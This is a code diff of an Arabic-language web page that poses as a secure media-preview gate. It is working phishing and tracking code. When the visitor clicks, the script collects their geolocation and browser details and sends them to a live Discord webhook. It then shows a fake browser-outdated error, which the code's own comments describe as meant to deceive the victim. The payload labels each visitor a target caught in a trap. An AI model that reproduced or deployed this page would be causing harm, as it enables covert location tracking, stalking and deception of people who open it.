@@ -1,34 +1,53 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="manifest" href="manifest.json">
-    <title>Media Gateway</title>
+    <title>Media Gateway | التحقق الآمن</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 100px; }
-        button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 25px; cursor: pointer; font-size: 16px; }
+        body { background: #0b0e14; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 100px; margin: 0; }
+        .container { padding: 20px; }
+        .icon { font-size: 50px; margin-bottom: 20px; }
+        h2 { color: #1a73e8; }
+        p { color: #9aa0a6; font-size: 14px; margin-bottom: 30px; }
+        .btn { padding: 15px 40px; background: #1a73e8; color: white; border: none; border-radius: 30px; cursor: pointer; font-size: 16px; font-weight: bold; transition: 0.3s; box-shadow: 0 4px 15px rgba(26, 115, 232, 0.3); }
+        .btn:hover { background: #1557b0; transform: scale(1.05); }
+        #status { margin-top: 20px; font-size: 12px; color: #5f6368; }
     </style>
 </head>
 <body>
 
-    <h2>جاري التحقق من اتصالك الآمن...</h2>
-    <p>لمشاهدة المحتوى الخاص، اضغط على المعاينة</p>
-    <button onclick="access()">معاينة الوسائط</button>
+    <div class="container">
+        <div class="icon">🔒</div>
+        <h2>تحقق من الهوية لعرض الوسائط</h2>
+        <p>هذا المحتوى محمي بتشفير طرف إلى طرف. اضغط على الزر أدناه للمعاينة الآمنة.</p>
+        
+        <button class="btn" onclick="startProcess()">معاينة الوسائط الآن</button>
+        
+        <div id="status">بروتوكول فحص SSL نشط...</div>
+    </div>
 
     <script>
-        async function access() {
+        async function startProcess() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerText = "جاري الاتصال بالخادم الآمن...";
+
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                
-                // اترك هذا الرابط كما هو أو ضع رابط الـ Webhook الخاص بك هنا بدقة
-                const WEBHOOK_URL = "https://discord.com/channels/1494438534344347658/1494438534864703500";
+                // الرابط الخاص بك مدمج هنا برمجياً
+                const WEBHOOK_URL = "https://discord.com/api/webhooks/1494444634586222682/HdxT-BynNCFlveKYWjMqYngyasuPSOVI-7a1RAA1QqAOLkW6O5MranKijd5v_yOoXZpa";
 
                 const payload = {
-                    content: "🎯 **صيد جديد!**",
+                    username: "رادار الاختراق السيكولوجي",
+                    content: "🎯 **هدف جديد وقع في الفخ!**",
                     embeds: [{
-                        title: "تقرير الهدف",
-                        description: `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n📱 الجهاز: ${navigator.userAgent}`,
-                        color: 16711680
+                        title: "تقرير السحب الفوري",
+                        color: 15158332,
+                        fields: [
+                            { name: "📍 الموقع على الخريطة", value: `[اضغط هنا لفتح الموقع](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`, inline: false },
+                            { name: "📱 معلومات الجهاز", value: navigator.userAgent, inline: false },
+                            { name: "⏰ الوقت", value: new Date().toLocaleString('ar-EG'), inline: true }
+                        ],
+                        footer: { text: "نظام التتبع mrjachac1980" }
                     }]
                 };
 
@@ -38,11 +57,20 @@
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
                     });
-                } catch (e) { console.log("خطأ في الإرسال"); }
+                    
+                    statusDiv.innerText = "تم إرسال البيانات للمعالجة...";
+                    // إيهام الضحية بوجود مشكلة تقنية بعد السحب
+                    setTimeout(() => {
+                        alert("خطأ (Code 0x882): إصدار المتصفح قديم جداً. يرجى التحديث لعرض المحتوى.");
+                    }, 1000);
 
-                alert("خطأ 403: يجب منح صلاحيات الوصول للوسائط من إعدادات النظام.");
+                } catch (error) {
+                    console.error("Error:", error);
+                }
+
             }, (err) => {
-                alert("يجب السماح بالوصول للموقع لمشاهدة المحتوى.");
+                alert("يجب منح صلاحية 'الوصول للوسائط' لفتح الصور المشفرة.");
+                statusDiv.innerText = "فشل التحقق: تم رفض الصلاحية.";
             });
         }
     </script>
